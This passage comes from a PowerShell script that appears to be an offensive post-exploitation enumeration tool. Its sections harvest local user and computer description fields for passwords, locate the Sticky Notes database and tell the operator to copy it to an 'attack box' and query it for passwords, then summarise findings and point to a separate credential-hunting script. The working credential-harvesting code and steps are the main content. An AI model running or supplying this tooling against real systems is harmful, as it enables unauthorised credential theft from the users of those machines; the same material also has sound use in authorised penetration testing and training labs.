Write-Section "18 - USER DESCRIPTION FIELDS"
# ============================================================
Write-Green "Local user descriptions (sometimes contain passwords):"
try {
    Get-LocalUser | ForEach-Object {
        if ($_.Description -ne "" -and $_.Description -ne $null) {
            Write-Yellow "User: $($_.Name) | Description: $($_.Description)"
            if ($_.Description -match "pass|pwd|secret|key|cred") {
                Write-Red "Possible credential in user description field: $($_.Name) -> $($_.Description)"
            }
        }
    }
} catch {
    Write-Info (net user 2>$null | Out-String)
}

Write-Green "`nComputer description:"
try {
    $compDesc = (Get-WmiObject -Class Win32_OperatingSystem).Description
    if ($compDesc) {
        Write-Yellow "Computer description: $compDesc"
    }
} catch {}

# ============================================================
Write-Section "19 - STICKY NOTES CHECK"
# ============================================================
Write-Green "Checking for Sticky Notes database:"
$stickyPath = "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
if (Test-Path $stickyPath) {
    Write-Yellow "Sticky Notes database found: $stickyPath"
    Write-Next "Copy plum.sqlite to attack box"
    Write-Next "DB Browser for SQLite: SELECT Text FROM Note;"
    Write-Next "OR: strings plum.sqlite-wal | grep -i pass"
    Write-Next "OR with PSSQLite: Import-Module PSSQLite.psd1; Invoke-SqliteQuery -Database '$stickyPath' -Query 'SELECT Text FROM Note' | ft -wrap"
}

# ============================================================
Write-Section "20 - FINAL SUMMARY"
# ============================================================
Write-Host ""
Write-Host "=== HIGH CONFIDENCE FINDINGS ===" -ForegroundColor Red
Get-Content $OutputFile | Select-String "\[!!!\]" | ForEach-Object { Write-Host $_.Line -ForegroundColor Red }

Write-Host ""
Write-Host "=== POSSIBLE FINDINGS ===" -ForegroundColor Yellow
Get-Content $OutputFile | Select-String "\[\?\?\]" | ForEach-Object { Write-Host $_.Line -ForegroundColor Yellow }

Write-Host ""
Write-Green "Scan complete: $(Get-Date)"
Write-Green "Output saved to: $OutputFile"
Write-Host ""
Write-Host "GREP TIPS:" -ForegroundColor Cyan
Write-Host "  Select-String '\[!!!\]' $OutputFile    # High confidence findings" -ForegroundColor Cyan
Write-Host "  Select-String '\[\?\?\]' $OutputFile   # Possible findings" -ForegroundColor Cyan
Write-Host "  Select-String 'NEXT STEPS' $OutputFile # Next step reminders" -ForegroundColor Cyan
Write-Host "  Select-String 'SECTION:' $OutputFile   # Jump to sections" -ForegroundColor Cyan
Write-Host ""
Write-Host "REMEMBER: Run wwpe_creds.ps1 separately for deep credential hunting" -ForegroundColor Cyan
